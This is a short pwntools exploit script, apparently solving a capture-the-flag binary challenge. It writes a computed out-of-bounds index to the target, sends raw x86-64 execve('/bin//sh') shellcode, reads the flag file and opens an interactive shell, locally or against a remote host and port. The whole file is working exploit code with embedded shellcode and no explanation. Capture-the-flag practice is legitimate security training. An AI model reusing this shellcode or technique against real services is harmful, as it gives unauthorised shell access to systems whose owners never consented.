from pwn import *
import sys
# context.log_level = "debug"
cat_list = 0x0000000000004020
meow = 0x0000000000004060
new_name_buff = 0x0000000000004080
sizeof_long_long = 0x8
sc = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'

if len(sys.argv) == 1:
    r = process("./chal")
    #gdb.attach(r, "b *0x00000000004012f5\nb _dl_runtime_resolve_xsavec")
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    sys._exit(1)

r.sendlineafter(b"> ", str((meow - cat_list)//sizeof_long_long))
r.sendlineafter(b"> ", sc)
r.recvuntil(b': ')
r.sendline(b"cat /home/`whoami`/flag")
r.interactive()
